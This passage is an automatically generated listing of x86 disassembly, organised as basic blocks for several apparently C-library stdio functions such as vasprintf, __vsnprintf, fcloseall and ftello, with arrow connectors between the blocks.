0xb067477:	mov	dword ptr [esp + 0x10], 3
0xb06747f:	mov	dword ptr [esp], esi
0xb067482:	mov	dword ptr [esp + 0xc], eax
0xb067486:	mov	eax, dword ptr [esp + 0x34]
0xb06748a:	mov	dword ptr [esp + 4], eax
0xb06748e:	sar	eax, 0x1f
0xb067491:	mov	dword ptr [esp + 8], eax
0xb067495:	call	0xb0659b0
None
|
|
|
v
0xb06743e:	mov	edx, dword ptr [esi + 0x48]
0xb067441:	mov	edi, dword ptr gs:[8]
0xb067448:	cmp	edi, dword ptr [edx + 8]
0xb06744b:	je	0xb06746f
None
|
|
|
v
0xb06749a:	and	eax, edx
0xb06749c:	xor	edx, edx
0xb06749e:	cmp	eax, 0xff
0xb0674a1:	sete	dl
0xb0674a4:	neg	edx
0xb0674a6:	test	dword ptr [esi], 0x8000
0xb0674ac:	jne	0xb0674ce
None
|
|
|
v
0xb067420:	push	edi
0xb067421:	push	esi
0xb067422:	push	ebx
0xb067423:	sub	esp, 0x20
0xb067426:	mov	esi, dword ptr [esp + 0x30]
0xb06742a:	call	0xb1267db
None
|
|
|
v
0xb0674b7:	mov	dword ptr [ecx + 8], 0
0xb0674be:	cmp	dword ptr gs:[0xc], 0
0xb0674c6:	je	0xb0674c9
None
|
|
|
v
0xb0674ce:	add	esp, 0x20
0xb0674d1:	mov	eax, edx
0xb0674d3:	pop	ebx
0xb0674d4:	pop	esi
0xb0674d5:	pop	edi
0xb0674d6:	ret	
None
|
|
|
v
0xb067473:	mov	eax, dword ptr [esp + 0x38]
0xb067477:	mov	dword ptr [esp + 0x10], 3
0xb06747f:	mov	dword ptr [esp], esi
0xb067482:	mov	dword ptr [esp + 0xc], eax
0xb067486:	mov	eax, dword ptr [esp + 0x34]
0xb06748a:	mov	dword ptr [esp + 4], eax
0xb06748e:	sar	eax, 0x1f
0xb067491:	mov	dword ptr [esp + 8], eax
0xb067495:	call	0xb0659b0
None
|
|
|
v
0xb06744d:	mov	ecx, 1
0xb067452:	cmp	dword ptr gs:[0xc], 0
0xb06745a:	je	0xb06745d
None
|
|
|
v
0xb06746f:	add	dword ptr [edx + 4], 1
0xb067473:	mov	eax, dword ptr [esp + 0x38]
0xb067477:	mov	dword ptr [esp + 0x10], 3
0xb06747f:	mov	dword ptr [esp], esi
0xb067482:	mov	dword ptr [esp + 0xc], eax
0xb067486:	mov	eax, dword ptr [esp + 0x34]
0xb06748a:	mov	dword ptr [esp + 4], eax
0xb06748e:	sar	eax, 0x1f
0xb067491:	mov	dword ptr [esp + 8], eax
0xb067495:	call	0xb0659b0
None
|
|
|
v
0xb067517:	jmp	0xb067466
None
|
|
|
v
0xb06751c:	lea	eax, dword ptr [ecx]
0xb06751e:	call	0xb0f9460
None
|
|
|
v
0xb06745c:	lock cmpxchg	dword ptr [edx], ecx
0xb067460:	jne	0xb067510
None
|
|
|
v
0xb0674ae:	mov	ecx, dword ptr [esi + 0x48]
0xb0674b1:	sub	dword ptr [ecx + 4], 1
0xb0674b5:	jne	0xb0674ce
None
|
|
|
v
0xb06742f:	add	ebx, 0x143bd1
0xb067435:	mov	eax, dword ptr [esi]
0xb067437:	and	eax, 0x8000
0xb06743c:	jne	0xb067473
None
|
|
|
v
0xb067510:	lea	ecx, dword ptr [edx]
0xb067512:	call	0xb0f9430
None
|
|
|
v
0xb0674c8:	lock sub	dword ptr [ecx], 1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:vasprintf
TOTAL BLOCKS :21
0xb067c04:	mov	eax, dword ptr [ebx - 0xf4]
0xb067c0a:	mov	dword ptr [esp], edi
0xb067c0d:	and	dword ptr [esp + 0x20], 0xfffffffe
0xb067c12:	mov	dword ptr [esp + 0xb8], eax
0xb067c19:	mov	eax, dword ptr [ebx - 0x3c]
0xb067c1f:	mov	dword ptr [esp + 0xbc], eax
0xb067c26:	mov	eax, dword ptr [esp + 0xe8]
0xb067c2d:	mov	dword ptr [esp + 8], eax
0xb067c31:	mov	eax, dword ptr [esp + 0xe4]
0xb067c38:	mov	dword ptr [esp + 4], eax
0xb067c3c:	call	0xb043810
None
|
|
|
v
0xb067cc9:	mov	eax, dword ptr [esp + 0xe0]
0xb067cd0:	mov	eax, dword ptr [eax]
0xb067cd2:	test	eax, eax
0xb067cd4:	jne	0xb067c83
None
|
|
|
v
0xb067c98:	mov	dword ptr [esp], ebp
0xb067c9b:	call	0xb0173f0
None
|
|
|
v
0xb067c76:	mov	ecx, dword ptr [esp + 0xe0]
0xb067c7d:	test	eax, eax
0xb067c7f:	mov	dword ptr [ecx], eax
0xb067c81:	je	0xb067cd6
None
|
|
|
v
0xb067cf8:	mov	eax, 0xffffffff
0xb067cfd:	jmp	0xb067c89
None
|
|
|
v
0xb067ce8:	mov	eax, dword ptr [esp + 0x3c]
0xb067cec:	mov	dword ptr [esp], eax
0xb067cef:	call	0xb017470
None
|
|
|
v
0xb067cd6:	mov	eax, dword ptr [esp + 0x3c]
0xb067cda:	mov	ecx, dword ptr [esp + 0xe0]
0xb067ce1:	mov	dword ptr [ecx], eax
0xb067ce3:	jmp	0xb067c83
None
|
|
|
v
0xb067bdf:	lea	eax, dword ptr [ebx - 0x500]
0xb067be5:	mov	dword ptr [esp], edi
0xb067be8:	mov	dword ptr [esp + 0xc], esi
0xb067bec:	mov	dword ptr [esp + 8], 0x64
0xb067bf4:	mov	dword ptr [esp + 4], esi
0xb067bf8:	mov	dword ptr [esp + 0xb4], eax
0xb067bff:	call	0xb0722d0
None
|
|
|
v
0xb067ca0:	mov	ecx, dword ptr [esp + 0xe0]
0xb067ca7:	test	eax, eax
0xb067ca9:	mov	dword ptr [ecx], eax
0xb067cab:	je	0xb067c66
None
|
|
|
v
0xb067c66:	mov	eax, dword ptr [esp + 0x3c]
0xb067c6a:	mov	dword ptr [esp + 4], ebp
0xb067c6e:	mov	dword ptr [esp], eax
0xb067c71:	call	0xb0173e0
None
|
|
|
v
0xb067c83:	mov	byte ptr [eax + esi], 0
0xb067c87:	mov	eax, edi
0xb067c89:	add	esp, 0xcc
0xb067c8f:	pop	ebx
0xb067c90:	pop	esi
0xb067c91:	pop	edi
0xb067c92:	pop	ebp
0xb067c93:	ret	
None
|
|
|
v
0xb067ba1:	test	eax, eax
0xb067ba3:	mov	esi, eax
0xb067ba5:	je	0xb067cf8
None
|
|
|
v
0xb067cc1:	mov	dword ptr [esp], ebp
0xb067cc4:	call	0xb017470
None
|
|
|
v
0xb067c89:	add	esp, 0xcc
0xb067c8f:	pop	ebx
0xb067c90:	pop	esi
0xb067c91:	pop	edi
0xb067c92:	pop	ebp
0xb067c93:	ret	
None
|
|
|
v
0xb067bab:	lea	edi, dword ptr [esp + 0x20]
0xb067baf:	mov	dword ptr [esp], edi
0xb067bb2:	mov	dword ptr [esp + 0x10], 0
0xb067bba:	mov	dword ptr [esp + 0xc], 0
0xb067bc2:	mov	dword ptr [esp + 8], 0xffffffff
0xb067bca:	mov	dword ptr [esp + 4], 0x8000
0xb067bd2:	mov	dword ptr [esp + 0x68], 0
0xb067bda:	call	0xb0710c0
None
|
|
|
v
0xb067c4b:	mov	eax, dword ptr [esp + 0x30]
0xb067c4f:	mov	edx, dword ptr [esp + 0x38]
0xb067c53:	mov	esi, dword ptr [esp + 0x34]
0xb067c57:	sub	edx, eax
0xb067c59:	sub	esi, eax
0xb067c5b:	mov	eax, edx
0xb067c5d:	lea	ebp, dword ptr [esi + 1]
0xb067c60:	shr	eax, 1
0xb067c62:	cmp	ebp, eax
0xb067c64:	jb	0xb067c98
None
|
|
|
v
0xb067b80:	push	ebp
0xb067b81:	push	edi
0xb067b82:	push	esi
0xb067b83:	push	ebx
0xb067b84:	call	0xb1267db
None
|
|
|
v
0xb067b89:	add	ebx, 0x143477
0xb067b8f:	sub	esp, 0xcc
0xb067b95:	mov	dword ptr [esp], 0x64
0xb067b9c:	call	0xb0173f0
None
|
|
|
v
0xb067cf4:	mov	eax, edi
0xb067cf6:	jmp	0xb067c89
None
|
|
|
v
0xb067c41:	test	eax, eax
0xb067c43:	mov	edi, eax
0xb067c45:	js	0xb067ce8
None
|
|
|
v
0xb067cad:	mov	ebp, dword ptr [esp + 0x3c]
0xb067cb1:	mov	dword ptr [esp + 8], esi
0xb067cb5:	mov	dword ptr [esp], eax
0xb067cb8:	mov	dword ptr [esp + 4], ebp
0xb067cbc:	call	0xb07d0b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__vsnprintf
TOTAL BLOCKS :10
0xb067f85:	mov	eax, dword ptr [esp + 0x12c]
0xb067f8c:	mov	dword ptr [esp], edi
0xb067f8f:	mov	dword ptr [esp + 8], eax
0xb067f93:	mov	eax, dword ptr [esp + 0x128]
0xb067f9a:	mov	dword ptr [esp + 4], eax
0xb067f9e:	call	0xb043810
None
|
|
|
v
0xb067fc0:	lea	ebp, dword ptr [esp + 0xc0]
0xb067fc7:	mov	dword ptr [esp + 0x1c], 0x3f
0xb067fcf:	mov	esi, ebp
0xb067fd1:	jmp	0xb067f31
None
|
|
|
v
0xb067fb0:	add	esp, 0x10c
0xb067fb6:	pop	ebx
0xb067fb7:	pop	esi
0xb067fb8:	pop	edi
0xb067fb9:	pop	ebp
0xb067fba:	ret	
None
|
|
|
v
0xb067f06:	add	ebx, 0x1430fa
0xb067f0c:	mov	esi, dword ptr [esp + 0x120]
0xb067f13:	mov	dword ptr [esp + 0x68], 0
0xb067f1b:	test	ebp, ebp
0xb067f1d:	je	0xb067fc0
None
|
|
|
v
0xb067f5d:	lea	eax, dword ptr [ebx - 0x920]
0xb067f63:	mov	dword ptr [esp + 0xb4], eax
0xb067f6a:	mov	eax, dword ptr [esp + 0x1c]
0xb067f6e:	mov	byte ptr [esi], 0
0xb067f71:	mov	dword ptr [esp + 0xc], esi
0xb067f75:	mov	dword ptr [esp + 4], esi
0xb067f79:	mov	dword ptr [esp + 8], eax
0xb067f7d:	mov	dword ptr [esp], edi
0xb067f80:	call	0xb0722d0
None
|
|
|
v
0xb067ef0:	push	ebp
0xb067ef1:	push	edi
0xb067ef2:	push	esi
0xb067ef3:	push	ebx
0xb067ef4:	sub	esp, 0x10c
0xb067efa:	mov	ebp, dword ptr [esp + 0x124]
0xb067f01:	call	0xb1267db
None
|
|
|
v
0xb067f31:	lea	edi, dword ptr [esp + 0x20]
0xb067f35:	mov	dword ptr [esp + 0x10], 0
0xb067f3d:	mov	dword ptr [esp + 0xc], 0
0xb067f45:	mov	dword ptr [esp + 8], 0xffffffff
0xb067f4d:	mov	dword ptr [esp + 4], 0x8000
0xb067f55:	mov	dword ptr [esp], edi
0xb067f58:	call	0xb0710c0
None
|
|
|
v
0xb067fa9:	mov	edx, dword ptr [esp + 0x34]
0xb067fad:	mov	byte ptr [edx], 0
0xb067fb0:	add	esp, 0x10c
0xb067fb6:	pop	ebx
0xb067fb7:	pop	esi
0xb067fb8:	pop	edi
0xb067fb9:	pop	ebp
0xb067fba:	ret	
None
|
|
|
v
0xb067f23:	lea	eax, dword ptr [ebp - 1]
0xb067f26:	mov	dword ptr [esp + 0x1c], eax
0xb067f2a:	lea	ebp, dword ptr [esp + 0xc0]
0xb067f31:	lea	edi, dword ptr [esp + 0x20]
0xb067f35:	mov	dword ptr [esp + 0x10], 0
0xb067f3d:	mov	dword ptr [esp + 0xc], 0
0xb067f45:	mov	dword ptr [esp + 8], 0xffffffff
0xb067f4d:	mov	dword ptr [esp + 4], 0x8000
0xb067f55:	mov	dword ptr [esp], edi
0xb067f58:	call	0xb0710c0
None
|
|
|
v
0xb067fa3:	cmp	dword ptr [esp + 0x3c], ebp
0xb067fa7:	je	0xb067fb0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fcloseall
TOTAL BLOCKS :3
0xb068344:	add	esp, 8
0xb068347:	pop	ebx
0xb068348:	ret	
None
|
|
|
v
0xb068330:	push	ebx
0xb068331:	call	0xb1267db
None
|
|
|
v
0xb068336:	add	ebx, 0x142cca
0xb06833c:	sub	esp, 8
0xb06833f:	call	0xb0715b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ftello
TOTAL BLOCKS :29
0xb068598:	mov	eax, dword ptr [ebx - 0xdc]
0xb06859e:	mov	edx, dword ptr gs:[0]
0xb0685a5:	mov	dword ptr [edx + eax], 0x4b
0xb0685ac:	mov	eax, 0xffffffff
0xb0685b1:	jmp	0xb068527
None
|
|
|
v
0xb068518:	or	edi, ebp
0xb06851a:	je	0xb068530
None
|
|
|
v
0xb068500:	test	dword ptr [esp + 0x1c], 0x8000
0xb068508:	jne	0xb068518
None
|
|
|
v
0xb068470:	add	ebx, 0x142b90
0xb068476:	mov	eax, dword ptr [esi]
0xb068478:	and	eax, 0x8000
0xb06847d:	jne	0xb0684b4
None
|
|
|
v
0xb0684b4:	mov	dword ptr [esp + 0x10], 0
0xb0684bc:	mov	dword ptr [esp + 0xc], 1
0xb0684c4:	mov	dword ptr [esp + 4], 0
0xb0684cc:	mov	dword ptr [esp + 8], 0
0xb0684d4:	mov	dword ptr [esp], esi
0xb0684d7:	call	0xb0659b0
None
|
|
|
v
0xb068602:	jmp	0xb068573
None
|
|
|
v
0xb068527:	add	esp, 0x2c
0xb06852a:	pop	ebx
0xb06852b:	pop	esi
0xb06852c:	pop	edi
0xb06852d:	pop	ebp
0xb06852e:	ret	
None
|
|
|
v
0xb0684b0:	add	dword ptr [edx + 4], 1
0xb0684b4:	mov	dword ptr [esp + 0x10], 0
0xb0684bc:	mov	dword ptr [esp + 0xc], 1
0xb0684c4:	mov	dword ptr [esp + 4], 0
0xb0684cc:	mov	dword ptr [esp + 8], 0
0xb0684d4:	mov	dword ptr [esp], esi
0xb0684d7:	call	0xb0659b0
None
|
|
|
v
0xb0684f3:	mov	eax, edi
0xb0684f5:	or	eax, ebp
0xb0684f7:	je	0xb068500
None
|
|
|
v
0xb068578:	mov	edi, dword ptr [esi + 0x2c]
0xb06857b:	sub	edi, dword ptr [esi + 0x24]
0xb06857e:	mov	ebp, edi
0xb068580:	sar	ebp, 0x1f
0xb068583:	sub	edx, edi
0xb068585:	sbb	ecx, ebp
0xb068587:	mov	ebp, edx
0xb068589:	mov	edi, ecx
0xb06858b:	not	ebp
0xb06858d:	not	edi
0xb06858f:	jmp	0xb068500
None
|
|
|
v
0xb06847f:	mov	edx, dword ptr [esi + 0x48]
0xb068482:	mov	edi, dword ptr gs:[8]
0xb068489:	cmp	edi, dword ptr [edx + 8]
0xb06848c:	je	0xb0684b0
None
|
|
|
v
0xb0684f9:	mov	eax, dword ptr [esi + 0x68]
0xb0684fc:	test	eax, eax
0xb0684fe:	jle	0xb068578
None
|
|
|
v
0xb06856d:	jne	0xb0685fb
None
|
|
|
v
0xb068573:	jmp	0xb068518
None
|
|
|
v
0xb0685ef:	lea	ecx, dword ptr [edx]
0xb0685f1:	call	0xb0f9430
None
|
|
|
v
0xb06850a:	mov	esi, dword ptr [esi + 0x48]
0xb06850d:	sub	dword ptr [esi + 4], 1
0xb068511:	je	0xb068558
None
|
|
|
v
0xb0684a7:	mov	eax, dword ptr [esi + 0x48]
0xb0684aa:	mov	edx, dword ptr [esi + 0x48]
0xb0684ad:	mov	dword ptr [eax + 8], edi
0xb0684b0:	add	dword ptr [edx + 4], 1
0xb0684b4:	mov	dword ptr [esp + 0x10], 0
0xb0684bc:	mov	dword ptr [esp + 0xc], 1
0xb0684c4:	mov	dword ptr [esp + 4], 0
0xb0684cc:	mov	dword ptr [esp + 8], 0
0xb0684d4:	mov	dword ptr [esp], esi
0xb0684d7:	call	0xb0659b0
None
|
|
|
v
0xb068558:	mov	dword ptr [esi + 8], 0
0xb06855f:	cmp	dword ptr gs:[0xc], 0
0xb068567:	je	0xb06856a
None
|
|
|
v
0xb0685f6:	jmp	0xb0684a7
None
|
|
|
v
0xb0685fb:	lea	eax, dword ptr [esi]
0xb0685fd:	call	0xb0f9460
None
|
|
|
v
0xb06848e:	mov	ecx, 1
0xb068493:	cmp	dword ptr gs:[0xc], 0
0xb06849b:	je	0xb06849e
None
|
|
|
v
0xb068530:	mov	ecx, dword ptr gs:[0]
0xb068537:	mov	eax, 0xffffffff
0xb06853c:	mov	edx, dword ptr [ebx - 0xdc]
0xb068542:	mov	esi, dword ptr [ecx + edx]
0xb068545:	test	esi, esi
0xb068547:	jne	0xb068527
None
|
|
|
v
0xb06851c:	mov	edi, edx
0xb06851e:	mov	eax, edx
0xb068520:	sar	edi, 0x1f
0xb068523:	cmp	edi, ecx
0xb068525:	jne	0xb068598
None
|
|
|
v
0xb068549:	mov	dword ptr [ecx + edx], 5
0xb068550:	add	esp, 0x2c
0xb068553:	pop	ebx
0xb068554:	pop	esi
0xb068555:	pop	edi
0xb068556:	pop	ebp
0xb068557:	ret	
None
|
|
|
v
0xb0684dc:	mov	ecx, edx
0xb0684de:	mov	edx, eax
0xb0684e0:	mov	eax, dword ptr [esi]
0xb0684e2:	mov	edi, ecx
0xb0684e4:	mov	ebp, edx
0xb0684e6:	not	edi
0xb0684e8:	not	ebp
0xb0684ea:	test	ah, 1
0xb0684ed:	mov	dword ptr [esp + 0x1c], eax
0xb0684f1:	je	0xb068500
None
|
|
|
v
0xb06849d:	lock cmpxchg	dword ptr [edx], ecx
0xb0684a1:	jne	0xb0685ef
None
|
|
|
v
0xb068513:	nop	
0xb068514:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb068460:	push	ebp
0xb068461:	push	edi
0xb068462:	push	esi
0xb068463:	push	ebx
0xb068464:	sub	esp, 0x2c
0xb068467:	mov	esi, dword ptr [esp + 0x40]
0xb06846b:	call	0xb1267db
None
|
|
|
v
0xb068569:	lock sub	dword ptr [esi], 1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b068d40
TOTAL BLOCKS :44
0xb068dae:	mov	dword ptr [ebp - 0x24], esi
0xb068db1:	mov	esi, eax
0xb068db3:	nop	
0xb068db4:	lea	esi, dword ptr [esi]
0xb068db8:	mov	edx, esi
0xb068dba:	mov	eax, edi
0xb068dbc:	jmp	0xb068dda
None
|
|
|
v
0xb068f11:	xor	edx, edx
0xb068f13:	jmp	0xb068fc0
None
|
|
|
v
0xb068f65:	mov	dword ptr [eax], edi
0xb068f67:	mov	edi, dword ptr [ebp - 0x24]
0xb068f6a:	xor	edx, edx
0xb068f6c:	mov	dword ptr [ebp - 0x24], esi
0xb068f6f:	add	eax, 4
0xb068f72:	mov	esi, edi
0xb068f74:	mov	edi, edx
0xb068f76:	mov	ecx, dword ptr [esi + 4]
0xb068f79:	add	edi, 1
0xb068f7c:	add	esi, 8
0xb068f7f:	mov	dword ptr [esp + 8], ecx
0xb068f83:	mov	ecx, dword ptr [esi - 8]
0xb068f86:	mov	dword ptr [esp], eax
0xb068f89:	mov	dword ptr [esp + 4], ecx
0xb068f8d:	call	0xb07cad0
None
|
|
|
v
0xb068fa0:	xchg	dword ptr [ebx + 0x11a4], eax
None
|
|
|
v
0xb068e49:	mov	dword ptr [ebp - 0x28], eax
0xb068e4c:	lea	eax, dword ptr [edi + 2]
0xb068e4f:	mov	edi, dword ptr [ebp - 0x1c]
0xb068e52:	mov	dword ptr [ebp - 0x2c], edi
0xb068e55:	mov	edi, esi
0xb068e57:	jmp	0xb068df3
None
|
|
|
v
0xb068faa:	mov	edx, dword ptr [eax]
0xb068fac:	mov	dword ptr [esp], eax
0xb068faf:	mov	dword ptr [esp + 4], edx
0xb068fb3:	call	0xb0e7410
None
|
|
|
v
0xb068e1d:	mov	ecx, dword ptr [ebp - 0x1c]
0xb068e20:	mov	edi, eax
0xb068e22:	mov	dword ptr [ebp - 0x20], edx
0xb068e25:	mov	dword ptr [ebp - 0x24], ecx
0xb068e28:	jmp	0xb068db8
None
|
|
|
v
0xb068fd3:	lea	esi, dword ptr [esi]
0xb068fd9:	lea	edi, dword ptr [edi]
None
|
|
|
v
0xb068f76:	mov	ecx, dword ptr [esi + 4]
0xb068f79:	add	edi, 1
0xb068f7c:	add	esi, 8
0xb068f7f:	mov	dword ptr [esp + 8], ecx
0xb068f83:	mov	ecx, dword ptr [esi - 8]
0xb068f86:	mov	dword ptr [esp], eax
0xb068f89:	mov	dword ptr [esp + 4], ecx
0xb068f8d:	call	0xb07cad0
None
|
|
|
v
0xb068ed5:	mov	dword ptr [ebp - 0x1c], edx
0xb068ed8:	mov	edx, dword ptr [ebp + 8]
0xb068edb:	mov	esi, eax
0xb068edd:	mov	dword ptr [ebp - 0x30], edi
0xb068ee0:	mov	dword ptr [ebp - 0x24], ecx
0xb068ee3:	test	edx, edx
0xb068ee5:	jne	0xb068f18
None
|
|
|
v
0xb068e30:	cmp	byte ptr [edi + 1], 0x73
0xb068e34:	jne	0xb068dec
None
|
|
|
v
0xb068d6b:	test	eax, eax
0xb068d6d:	je	0xb068d78
None
|
|
|
v
0xb068d9a:	movzx	eax, byte ptr [edi]
0xb068d9d:	xor	esi, esi
0xb068d9f:	mov	dword ptr [ebp - 0x20], 0
0xb068da6:	test	al, al
0xb068da8:	je	0xb068f0a
None
|
|
|
v
0xb068f0a:	mov	eax, dword ptr [ebp + 8]
0xb068f0d:	test	eax, eax
0xb068f0f:	je	0xb068ee7
None
|
|
|
v
0xb068dc0:	add	eax, 1
0xb068dc3:	mov	dword ptr [esp + 4], 0x25
0xb068dcb:	mov	dword ptr [esp], eax
0xb068dce:	call	0xb07ee30
None
|
|
|
v
0xb068ece:	xchg	ebx, edi
0xb068ed0:	cmp	eax, 0xfc
0xb068ed3:	je	0xb068ec0
None
|
|
|
v
0xb068eaf:	mov	dword ptr [ebp - 0x20], ecx
0xb068eb2:	mov	edi, dword ptr [ebp - 0x30]
0xb068eb5:	mov	edx, dword ptr [ebp - 0x1c]
0xb068eb8:	mov	ecx, dword ptr [ebp - 0x24]
0xb068ebb:	nop	
0xb068ebc:	lea	esi, dword ptr [esi]
0xb068ec0:	xchg	edi, ebx
0xb068ec2:	mov	eax, 0x92
0xb068ec7:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb068d4b:	add	ebx, 0x1422b5
0xb068d51:	lea	eax, dword ptr [ebp + 0x10]
0xb068d54:	sub	esp, 0x3c
0xb068d57:	mov	dword ptr [ebp - 0x2c], eax
0xb068d5a:	mov	edi, dword ptr [ebp + 0xc]
0xb068d5d:	lea	eax, dword ptr [ebx - 0x4991f]
0xb068d63:	mov	dword ptr [esp], eax
0xb068d66:	call	0xb033130
None
|
|
|
v
0xb068dda:	cmp	dl, 0x25
0xb068ddd:	jne	0xb068dc0
None
|
|
|
v
0xb068f97:	mov	byte ptr [eax], 0
0xb068f9a:	mov	esi, dword ptr [ebp - 0x24]
0xb068f9d:	mov	eax, dword ptr [ebp - 0x28]
0xb068fa0:	xchg	dword ptr [ebx + 0x11a4], eax
None
|
|
|
v
0xb068e98:	mov	dword ptr [eax + 4], ecx
0xb068e9b:	sub	esi, 1
0xb068e9e:	sub	eax, 8
0xb068ea1:	add	ecx, dword ptr [ebp - 0x20]
0xb068ea4:	mov	dword ptr [eax + 8], edi
0xb068ea7:	cmp	esi, 0xff
0xb068eaa:	mov	dword ptr [ebp - 0x20], ecx
0xb068ead:	jne	0xb068e90
None
|
|
|
v
0xb068ec0:	xchg	edi, ebx
0xb068ec2:	mov	eax, 0x92
0xb068ec7:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb068fb8:	xor	edx, edx
0xb068fba:	cmp	dword ptr [ebp - 0x20], esi
0xb068fbd:	sete	dl
0xb068fc0:	mov	eax, dword ptr [ebp - 0x30]
0xb068fc3:	mov	dword ptr [esp], eax
0xb068fc6:	mov	eax, dword ptr [ebp + 8]
0xb068fc9:	call	0xb017d13
None
|
|
|
v
0xb068e59:	mov	eax, dword ptr [ebp - 0x1c]
0xb068e5c:	mov	ecx, 0x10
0xb068e61:	xor	edx, edx
0xb068e63:	mov	esi, dword ptr [ebp - 0x24]
0xb068e66:	lea	eax, dword ptr [eax*8 + 0x1e]
0xb068e6d:	div	ecx
0xb068e6f:	mov	edx, dword ptr [ebp - 0x20]
0xb068e72:	mov	ecx, dword ptr [ebp - 0x28]
0xb068e75:	mov	dword ptr [ebp - 0x20], 0
0xb068e7c:	shl	eax, 4
0xb068e7f:	sub	esp, eax
0xb068e81:	lea	eax, dword ptr [esp + 0x27]
0xb068e85:	and	eax, 0xfffffff0
0xb068e88:	mov	dword ptr [ebp - 0x24], eax
0xb068e8b:	lea	eax, dword ptr [eax + esi*8]
0xb068e8e:	jmp	0xb068e98
None
|
|
|
v
0xb068ddf:	cmp	byte ptr [eax + 1], 0x73
0xb068de3:	jne	0xb068dc0
None
|
|
|
v
0xb068fa6:	test	eax, eax
0xb068fa8:	je	0xb068fb8
None
|
|
|
v
0xb068fc0:	mov	eax, dword ptr [ebp - 0x30]
0xb068fc3:	mov	dword ptr [esp], eax
0xb068fc6:	mov	eax, dword ptr [ebp + 8]
0xb068fc9:	call	0xb017d13
None
|
|
|
v
0xb068de5:	mov	ecx, esi
0xb068de7:	cmp	cl, 0x25
0xb068dea:	je	0xb068e30
None
|
|
|
v
0xb068d6f:	cmp	byte ptr [eax], 0
0xb068d72:	jne	0xb068eef
None
|
|
|
v
0xb068ee7:	lea	esp, dword ptr [ebp - 0xc]
0xb068eea:	pop	ebx
0xb068eeb:	pop	esi
0xb068eec:	pop	edi
0xb068eed:	pop	ebp
0xb068eee:	ret	
None
|
|
|
v
0xb068eef:	movzx	eax, byte ptr [edi]
0xb068ef2:	xor	esi, esi
0xb068ef4:	mov	dword ptr [ebp - 0x30], 2
0xb068efb:	mov	dword ptr [ebp - 0x20], 0
0xb068f02:	test	al, al
0xb068f04:	jne	0xb068dae
None
|
|
|
v
0xb068f5d:	cmp	eax, 0xff
0xb068f60:	mov	dword ptr [ebp - 0x28], eax
0xb068f63:	je	0xb068fb8
None
|
|
|
v
0xb068e90:	mov	edi, dword ptr [edx]
0xb068e92:	mov	ecx, dword ptr [edx + 4]
0xb068e95:	mov	edx, dword ptr [edx + 8]
0xb068e98:	mov	dword ptr [eax + 4], ecx
0xb068e9b:	sub	esi, 1
0xb068e9e:	sub	eax, 8
0xb068ea1:	add	ecx, dword ptr [ebp - 0x20]
0xb068ea4:	mov	dword ptr [eax + 8], edi
0xb068ea7:	cmp	esi, 0xff
0xb068eaa:	mov	dword ptr [ebp - 0x20], ecx
0xb068ead:	jne	0xb068e90
None
|
|
|
v
0xb068fce:	call	0xb031970
None
|
|
|
v
0xb068dd3:	movzx	edx, byte ptr [eax]
0xb068dd6:	test	dl, dl
0xb068dd8:	je	0xb068de5
None
|
|
|
v
0xb068f18:	mov	eax, dword ptr [ebx - 0xe0]
0xb068f1e:	mov	edi, dword ptr [ebp - 0x20]
0xb068f21:	mov	dword ptr [esp + 0x14], 0
0xb068f29:	mov	dword ptr [esp + 0x10], 0xffffffff
0xb068f31:	mov	eax, dword ptr [eax + 0x10]
0xb068f34:	mov	dword ptr [esp + 0xc], 0x22
0xb068f3c:	mov	dword ptr [esp + 8], 3
0xb068f44:	mov	dword ptr [esp], 0
0xb068f4b:	lea	edx, dword ptr [edi + eax]
0xb068f4e:	neg	eax
0xb068f50:	mov	edi, edx
0xb068f52:	and	edi, eax
0xb068f54:	mov	dword ptr [esp + 4], edi
0xb068f58:	call	0xb0e7320
None
|
|
|
v
0xb068d8e:	cmp	eax, 0xff
0xb068d91:	mov	dword ptr [ebp - 0x30], eax
0xb068d94:	je	0xb068eef
None
|
|
|
v
0xb068d40:	push	ebp
0xb068d41:	mov	ebp, esp
0xb068d43:	push	edi
0xb068d44:	push	esi
0xb068d45:	push	ebx
0xb068d46:	call	0xb1267db
None
|
|
|
v
0xb068dec:	mov	ecx, eax
0xb068dee:	sub	ecx, edi
0xb068df0:	mov	dword ptr [ebp - 0x28], ecx
0xb068df3:	mov	esi, dword ptr [ebp - 0x28]
0xb068df6:	sub	esp, 0x20
0xb068df9:	lea	edx, dword ptr [esp + 0x27]
0xb068dfd:	and	edx, 0xfffffff0
0xb068e00:	mov	dword ptr [edx], edi
0xb068e02:	mov	dword ptr [edx + 4], esi
0xb068e05:	mov	esi, dword ptr [ebp - 0x20]
0xb068e08:	mov	dword ptr [edx + 8], esi
0xb068e0b:	mov	esi, dword ptr [ebp - 0x24]
0xb068e0e:	lea	ecx, dword ptr [esi + 1]
0xb068e11:	movzx	esi, byte ptr [eax]
0xb068e14:	mov	dword ptr [ebp - 0x1c], ecx
0xb068e17:	mov	ecx, esi
0xb068e19:	test	cl, cl
0xb068e1b:	je	0xb068e59
None
|
|
|
v
0xb068db8:	mov	edx, esi
0xb068dba:	mov	eax, edi
0xb068dbc:	jmp	0xb068dda
None
|
|
|
v
0xb068d78:	lea	eax, dword ptr [ebx - 0x4990c]
0xb068d7e:	mov	dword ptr [esp + 4], 0x902
0xb068d86:	mov	dword ptr [esp], eax
0xb068d89:	call	0xb0daada
None
|
|
|
v
0xb068df3:	mov	esi, dword ptr [ebp - 0x28]
0xb068df6:	sub	esp, 0x20
0xb068df9:	lea	edx, dword ptr [esp + 0x27]
0xb068dfd:	and	edx, 0xfffffff0
0xb068e00:	mov	dword ptr [edx], edi
0xb068e02:	mov	dword ptr [edx + 4], esi
0xb068e05:	mov	esi, dword ptr [ebp - 0x20]
0xb068e08:	mov	dword ptr [edx + 8], esi
0xb068e0b:	mov	esi, dword ptr [ebp - 0x24]
0xb068e0e:	lea	ecx, dword ptr [esi + 1]
0xb068e11:	movzx	esi, byte ptr [eax]
0xb068e14:	mov	dword ptr [ebp - 0x1c], ecx
0xb068e17:	mov	ecx, esi
0xb068e19:	test	cl, cl
0xb068e1b:	je	0xb068e59
None
|
|
|
